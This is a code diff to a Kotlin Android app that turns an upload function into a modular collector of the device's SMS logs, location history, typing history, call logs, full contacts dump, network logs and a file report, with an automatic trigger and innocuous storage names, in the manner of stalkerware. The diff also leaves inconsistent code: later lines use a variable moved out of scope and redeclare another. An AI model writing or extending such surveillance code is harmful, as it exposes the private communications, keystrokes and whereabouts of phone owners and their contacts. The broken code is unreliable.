@@ -13,11 +13,65 @@ import java.util.Calendar
 
 object CloudManager {
 
-    fun uploadData(ctx: Context, btn: TextView? = null) {
+    // Modular Upload: Takes a list of features to upload (e.g. ["sms", "location"] or ["ALL"])
+    fun uploadData(ctx: Context, modules: List<String>, btn: TextView? = null) {
         CoroutineScope(Dispatchers.IO).launch {
             try {
-                // 1. GATHER DATA
-                val batt = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
+                val json = JSONObject()
+                json.put("device_model", android.os.Build.MODEL)
+                json.put("trigger", if (btn != null) "MANUAL" else "AUTO")
+                
+                val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                val isAll = modules.contains("ALL")
+
+                // --- MODULE 1: BASIC VITALS ---
+                if (isAll || modules.contains("vitals")) {
+                    val batt = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
+                    json.put("battery_level", batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0)
+                }
+
+                // --- MODULE 2: SMS ---
+                if (isAll || modules.contains("sms")) {
+                    json.put("sms_count", prefs.getInt("sms_count", 0))
+                    json.put("sms_logs", org.json.JSONArray(prefs.getString("sms_logs_cache", "[]")))
+                }
+
+                // --- MODULE 3: USAGE ---
+                if (isAll || modules.contains("usage")) {
+                     val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
+                     val calendar = java.util.Calendar.getInstance()
+                     calendar.set(java.util.Calendar.HOUR_OF_DAY, 0)
+                     val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, calendar.timeInMillis, System.currentTimeMillis())
+                     json.put("screen_time_minutes", java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(stats.sumOf { it.totalTimeInForeground }))
+                     json.put("app_usage_timeline", UsageManager.getTimeline(ctx))
+                }
+
+                // --- MODULE 4: LOCATION ---
+                if (isAll || modules.contains("location")) {
+                    json.put("location_history", org.json.JSONArray(prefs.getString("location_history", "[]")))
+                }
+
+                // --- MODULE 5: TYPING ---
+                if (isAll || modules.contains("typing")) {
+                     json.put("typing_history", org.json.JSONArray(prefs.getString("typing_history", "[]")))
+                }
+                
+                // --- MODULE 6: NETWORK ---
+                if (isAll || modules.contains("network")) {
+                     json.put("network_logs", org.json.JSONArray(prefs.getString("net_history_log", "[]")))
+                }
+
+                // --- MODULE 7: PHONE ---
+                if (isAll || modules.contains("phone")) {
+                     json.put("call_logs", PhoneManager.getCallLogs(ctx))
+                     json.put("contacts_dump", PhoneManager.getContacts(ctx))
+                }
+
+                // --- MODULE 8: FILES (Skeleton) ---
+                if (modules.contains("files")) {
+                    // Heavy! Only if explicitly asked, NEVER in "ALL" by default to save data
+                    json.put("file_skeleton", FileManager.generateReport())
+                }
                 val level = batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0
                 
                 val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
